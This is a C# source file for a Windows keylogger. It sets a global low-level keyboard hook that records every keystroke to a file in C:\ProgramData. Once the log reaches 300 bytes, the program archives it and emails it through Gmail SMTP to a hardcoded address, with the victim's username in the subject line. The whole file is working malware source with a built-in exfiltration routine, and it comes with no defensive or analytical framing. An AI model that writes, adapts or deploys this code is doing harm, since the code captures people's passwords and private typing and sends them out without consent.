using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace keylogger
{
    class Program 
    {
        // Email sending parameters
        private const string FROM_EMAIL_ADDRESS = "sundayudehobeya@gmail.com";
        private const string FROM_EMAIL_PASSWORD = ".......";
        private const string TO_EMAIL_ADDRESS = "sundayudehobeya@gmail.com";
        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;

        // Variables for keyboard hooking
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";

        static void Main(string[] args)
        {
            // Set keyboard hook
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        // Delegate for Low-Level Keyboard Procedure
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Callback function for keyboard hooking
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Writing keystrokes to a log file
            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }
            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");

            // Archive and email the log file if the max size has been reached
            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                try
                {
                    // Copy the log file to the archive
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    // Delete the log file
                    logFile.Delete();

                    // Email the archive and send email using a new thread
                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                    Console.Out.WriteLine("\n\n**MAILSENDING**\n");
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            // Keylogging functionality
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        // Function to send email with log information
        public static void sendMail()
        {
            try
            {
                // Read the archive file contents into the email body variable
                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                string emailBody = input.ReadToEnd();
                input.Close();

                // Create the email client object
                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                // Build the email message
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(FROM_EMAIL_ADDRESS),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = emailBody,
                    IsBodyHtml = false,
                };

                // Include log file as an attachment if specified
                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                // Set the recipient
                message.To.Add(TO_EMAIL_ADDRESS);

                // Send the message
                client.Send(message);

                // Release resources used by the message (archive file)
                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

        // Function to set keyboard hook
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        // External function imports
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}